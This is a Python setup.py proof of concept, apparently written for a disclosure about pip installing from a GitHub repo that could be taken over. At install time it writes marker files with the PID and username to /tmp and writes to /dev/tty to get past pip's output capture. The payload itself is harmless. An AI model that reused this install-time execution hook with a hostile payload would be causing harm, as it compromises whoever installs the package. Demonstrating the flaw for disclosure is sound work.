from setuptools import setup
import os
import sys

# Create a VERY OBVIOUS file
poc_file = f"/tmp/PIP_GITHUB_RCE_{os.getpid()}.txt"
with open(poc_file, "w") as f:
    f.write("="*70 + "\n")
    f.write("🚨 PROOF OF CODE EXECUTION DURING PIP INSTALL\n")
    f.write("="*70 + "\n")
    f.write(f"Process ID: {os.getpid()}\n")
    f.write(f"User: {os.getenv('USER')}\n")
    f.write(f"Command: pip install git+https://github.com/TalhaKhan-404/test.git\n")
    f.write("\n" + "-"*70 + "\n")
    f.write("SAP VULNERABILITY REPRODUCED:\n")
    f.write("Original: git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
    f.write("Test:    git+https://github.com/TalhaKhan-404/test.git\n")
    f.write("-"*70 + "\n")
    f.write("IMPACT: GitHub repo takeover → pip install → RCE\n")
    f.write("="*70 + "\n")

# Write DIRECTLY to terminal (bypass pip's output capture)
try:
    # Try to write to the actual terminal
    term = open("/dev/tty", "w")
    term.write("\n" + "🚨"*70 + "\n")
    term.write("🚨 POC EXECUTING: pip install from GitHub = Code execution\n")
    term.write("🚨"*70 + "\n")
    term.write(f"\n✅ Proof file: {poc_file}\n")
    term.write(f"📝 Check with: cat {poc_file}\n")
    term.write("\n🔗 Same as SAP HANA vulnerability\n")
    term.write("⚠️  Risk: Compromised repo → pip install → SYSTEM COMPROMISE\n")
    term.write("🚨"*70 + "\n")
    term.close()
except:
    pass

# Also create a file that's impossible to miss
with open(f"/tmp/🚨_RCE_VULNERABILITY_CONFIRMED_🚨", "w") as f:
    f.write("YES - CODE EXECUTES DURING PIP INSTALL FROM GITHUB\n")

setup(
    name='force-visible-poc',
    version='0.1.0',
)
